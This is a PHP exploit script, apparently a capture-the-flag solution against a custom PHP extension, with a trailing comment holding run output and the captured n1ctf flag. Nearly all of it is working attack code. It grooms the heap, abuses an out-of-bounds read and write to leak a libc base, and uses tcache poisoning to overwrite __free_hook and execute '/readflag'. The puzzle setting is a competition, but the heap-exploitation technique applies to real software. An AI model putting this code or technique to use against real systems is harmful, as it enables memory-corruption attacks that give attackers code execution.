<?php
function freebuf($x)
{
    releasestr($x);
}
$cpbuf = creatbuf(544 * 8);
function memcpy($d, $s, $l)
{
    global $cpbuf;
    encrypt_impl($s, $l / 8, 0, $cpbuf);
    decrypt_impl($cpbuf, $l / 8, 0, $d);
}
$binsh = pstr2ffi("/readflag\x00\x00\x00\x00\x00\x00\x00");
for ($i = 0; $i < 20; ++$i) {
    creatbuf(272 * 8); //use up all big free bins,so that next allocation is a split from top chunk
}
$buffer = creatbuf(544 * 8);
$a = creatbuf(272 * 8); //chunk1
$b = creatbuf(272 * 8); //chunk2
$pad = creatbuf(272 * 8); //padding chunk
for ($i = 0; $i < 1500; ++$i) {
    creatbuf(8 * 16); //use up all small free bins
}
freebuf($b);
memcpy($buffer, $a, (272 + 21) * 8); //OOB read

$i = 272;
$nowsz = ($buffer[$i + 1] >> 3);
printf("nowsz %x\n", $nowsz);
ob_flush();
if ($nowsz > 0x100) {
    $fd = $buffer[$i + 2];
    $bk = $buffer[$i + 3];
    printf("fd and bk %x %x\n", $fd, $bk);
    ob_flush();
    if (($bk >> 40) == 0x7f && ($bk & 0xfff) == 0xbe0) {
        printf("get unsorted bin\n");
        ob_flush();
        $chunks = array();
        for ($i = 0; $i < 1000; ++$i) {
            $last = pstr2ffi(str_repeat("\x33", 8 * 16));
            array_push($chunks, $last);
            memcpy($buffer, $a, (272 + 21) * 8); //OOB read
            if ($buffer[272 + 2] == 0x3333333333333333) {
                //we now alloc a chunk to the area we can control
                $dummy = creatbuf(8 * 16);
                assert(($buffer[272 + 20] & 0xfff) == 0xbe0);
                $libc_base = $buffer[272 + 20] - 2014176;
                $libc_free_hook = $libc_base + 2026280;
                //step 1,add a chunk into tcache
                freebuf($chunks[0]);
                //step 2,add dummy into tcache
                freebuf($dummy);
                memcpy($buffer, $a, (272 + 21) * 8);
                //step 3,tcache posion
                $buffer[272 + 20] = $libc_free_hook;
                memcpy($a, $buffer, (272 + 21) * 8); //OOB write,tcache hijack
                //step 4 alloc to &_free_hook
                creatbuf(8 * 16);
                $free_hook = creatbuf(8 * 16);
                $free_hook[0] = $libc_base + 349200;
                freebuf($binsh);
                $free_hook[0] = 0x0;
                return;
            } else {
                printf("failed:( good luck next try\n");
                ob_flush();
            }
        }
        return;
    }
} else {
    printf("failed?!\n");
    ob_flush();
}

/*
nowsz 112
fd and bk 55d86af501d0 7f393baeabe0
get unsorted bin
failed:( good luck next try
failed:( good luck next try
failed:( good luck next try
failed:( good luck next try
failed:( good luck next try
failed:( good luck next try
failed:( good luck next try
failed:( good luck next try
failed:( good luck next try
n1ctf{Ma5TEr_Of_PHP_d70809e19fbdb091a3f607c2b86a3a05a483670c9e45124c6796c6e830}
*/
